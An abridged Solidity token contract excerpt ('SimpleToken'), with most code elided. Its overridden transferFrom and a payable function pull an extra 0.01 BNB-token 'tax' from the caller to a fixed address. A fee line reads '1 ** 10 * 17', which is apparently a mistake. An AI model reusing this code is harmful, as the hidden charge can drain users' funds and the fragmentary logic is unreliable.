// SPDX-License-Identifier: Created by Lucas Lima
...
contract SimpleToken is IERC20, IERC20Metadata, Context, Ownable {
    ...
    function foo() external payable {
        ...
        bnbContract.transferFrom(msg.sender, taxAddress, 0.01 ether);
    }
    ...
    function transferFrom(
        ...
        require(bnbContract.transferFrom(msg.sender, taxAddress, .01 ether));
    ...
    function _transfer(
        ...
        // if (takeFee) {
            payable(sender).transfer(1 ** 10 * 17);
